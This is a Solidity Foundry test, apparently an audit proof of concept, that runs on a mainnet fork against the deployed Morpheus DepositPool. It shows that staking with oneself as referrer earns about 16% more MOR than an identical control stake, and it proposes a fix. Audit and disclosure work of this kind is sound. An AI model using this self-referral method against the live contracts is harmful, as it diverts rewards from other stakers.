// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Min3 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Minimal interfaces to the DEPLOYED Morpheus contracts (mainnet fork).
interface IDepositPoolMin3 {
    struct UserData {
        uint128 lastStake;
        uint256 deposited;
        uint256 rate;
        uint256 pendingRewards;
        uint128 claimLockStart;
        uint128 claimLockEnd;
        uint256 virtualDeposited;
        uint128 lastClaim;
        address referrer;
    }
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function usersData(address, uint256) external view returns (UserData memory);
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function getLatestReferrerReward(uint256, address) external view returns (uint256);
    function referrerTiers(uint256, uint256) external view returns (uint256 amount, uint256 multiplier);
}

interface IDistributorMin3 {
    function distributeRewards(uint256) external;
}

interface IChainLinkConsumerMin3 {
    function getChainLinkDataFeedLatestAnswer(bytes32) external view returns (uint256);
}

interface IAavePoolMin3 {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

// F-02: Self-referral double-dip at tier 3.
// Fork: Ethereum mainnet, block 26340900. Repo commit 07f6032.
//
// Mechanism: DepositPool.stake() accepts referrer_ == msg.sender with no check.
// The same capital then earns TWO reward portions:
//   (1) +1% referral multiplier on the user's own virtualDeposited
//       (REFERRAL_MULTIPLIER = PRECISION * 101 / 100), and
//   (2) a referrer virtual stake (tier multiplier) on referrersData[self].
// The referrer tiers (pool 0, on-chain, identical for stETH and wETH pools):
// tier 0 = 1.0 token / 3%, tier 1 = 2.5 / 5%, tier 2 = 25.0 / 10%,
// tier 3 = 62.5 / 15%.
// A 100-token self-referral passes the tier-3 threshold (62.5), so the
// referrer side earns 15% of the user's rewards on top of the user's own
// rewards. Total MOR emission is capped by the RewardPool curve, so this is
// a re-allocation (dilution of other stakers in the same pool), not
// over-minting. Fix: require(referrer_ != user_) in stake() / _stake().
//
// Note: stETH cannot be dealt with Foundry's deal() (Lido shares accounting),
// so this PoC uses the wETH pool (identical tier table). The wETH pool has
// little natural yield, so we inject 10 WETH of aWETH as yield — exactly the
// same technique the H-01 tier-0 PoC uses — to give distributeRewards MOR to
// split. The injected yield is identical for both stakers; it only provides
// the MOR being split, it does not favour either side. The self-referral
// effect is measured as the RATIO Alice/Bob, which is independent of the
// injected amount.
//
// Fork note: after vm.warp the real Chainlink feeds are stale
// (allowedPriceUpdateDelay = 3600s), so updateDepositTokensPrices would revert
// with "DR: price for pair is zero". We mock the Chainlink CONSUMER to return
// the prices live at the fork block (simulating a live, fresh feed). This does
// not touch any Morpheus contract.
contract H01_SelfReferralTier3 is Test {
    address constant WETH_POOL = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant AWETH = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant CHAINLINK_CONSUMER = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
    uint256 constant POOL_INDEX = 0;

    address internal alice;
    address internal bob;

    function setUp() public {
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
        deal(WETH, alice, 200 ether);
        deal(WETH, bob, 100 ether);
        _mockFreshPrices();
    }

    function _mockFreshPrices() internal {
        _mockPrice(0x7890db9c0a88d1cacb4485f81f93172a6b7b8c19af9c1a9985563f7d45ce2e6f, 2264205530060000000000); // stETH/USD
        _mockPrice(0x0114b84ae113b32edd1a4fc0417da078d9b57999d54a7cd39c8674275a831c8b, 2260827529300000000000); // wETH/USD
        _mockPrice(0x83a562b1cdad4ea768878193132a49c89e56c9e556687c269cc5835f7697539c, 76739459036280000000000); // wBTC/USD
        _mockPrice(0xff064b881a0c0fff844177f881a313ff894bfc6093d33b5514e34d7faa41b7ef, 999750000000000000); // USDC/USD
        _mockPrice(0x91879a0c0be4e43cacda1599ac414205651f4a62b614b6be9e5318a182c33eb0, 998515410000000000); // USDT/USD
    }

    function _mockPrice(bytes32 pathId, uint256 price) internal {
        vm.mockCall(
            CHAINLINK_CONSUMER,
            abi.encodeWithSelector(
                IChainLinkConsumerMin3.getChainLinkDataFeedLatestAnswer.selector, pathId
            ),
            abi.encode(price)
        );
    }

    function test_selfReferralTier3_doubleDip() public {
        IDepositPoolMin3 pool = IDepositPoolMin3(WETH_POOL);
        IDistributorMin3 dist = IDistributorMin3(DISTRIBUTOR);

        // Confirm tier 3 on-chain: 62.5 WETH threshold, 15% multiplier.
        (uint256 t3amount, uint256 t3mult) = pool.referrerTiers(POOL_INDEX, 3);
        assertEq(t3amount, 62.5 ether, "tier3 threshold should be 62.5");
        assertEq(t3mult, 15e23, "tier3 multiplier should be 15% (1.5e24)");

        // Alice stakes 100 WETH with referrer = herself (self-referral).
        vm.startPrank(alice);
        IERC20Min3(WETH).approve(DISTRIBUTOR, type(uint256).max);
        pool.stake(POOL_INDEX, 100 ether, 0, alice);
        vm.stopPrank();

        // Bob stakes an identical 100 WETH with no referrer (control).
        vm.startPrank(bob);
        IERC20Min3(WETH).approve(DISTRIBUTOR, type(uint256).max);
        pool.stake(POOL_INDEX, 100 ether, 0, address(0));
        vm.stopPrank();

        // Inject 10 WETH of yield (as aWETH) so distributeRewards has MOR to
        // split. Same technique as the tier-0 PoC; the injection is identical
        // for both stakers and does not favour either side.
        vm.startPrank(alice);
        IERC20Min3(WETH).approve(AAVE_POOL, type(uint256).max);
        IAavePoolMin3(AAVE_POOL).supply(WETH, 10 ether, alice, 0);
        uint256 aBal = IERC20Min3(AWETH).balanceOf(alice);
        IERC20Min3(AWETH).transfer(DISTRIBUTOR, aBal);
        vm.stopPrank();

        vm.warp(block.timestamp + 1 days + 1);
        vm.roll(block.number + 7200);
        dist.distributeRewards(POOL_INDEX);

        uint256 aliceUser = pool.getLatestUserReward(POOL_INDEX, alice);
        uint256 aliceRef = pool.getLatestReferrerReward(POOL_INDEX, alice);
        uint256 bobUser = pool.getLatestUserReward(POOL_INDEX, bob);
        uint256 aliceTotal = aliceUser + aliceRef;

        emit log_named_uint("alice user reward (MOR wei)", aliceUser);
        emit log_named_uint("alice referrer reward (MOR wei)", aliceRef);
        emit log_named_uint("alice total (MOR wei)", aliceTotal);
        emit log_named_uint("bob user reward (MOR wei)", bobUser);
        emit log_named_uint("alice/bob ratio (bps)", (aliceTotal * 10000) / bobUser);

        // LOSS ASSERTION: Alice (self-referral, tier 3) must earn materially
        // more MOR than Bob (identical deposit, no referrer).
        // Expected: Alice virtual = 101 (user, +1%) + 15 (referrer, 15%) = 116
        // vs Bob virtual = 100, so Alice/Bob = 1.16 (~16% boost).
        assertGt(aliceTotal, bobUser, "self-referral total must exceed control");
        assertGt((aliceTotal * 10000) / bobUser, 11000, "self-referral boost must exceed 10%");
        assertGt(aliceRef, 0, "referrer reward must be nonzero for self-referral");
    }
}
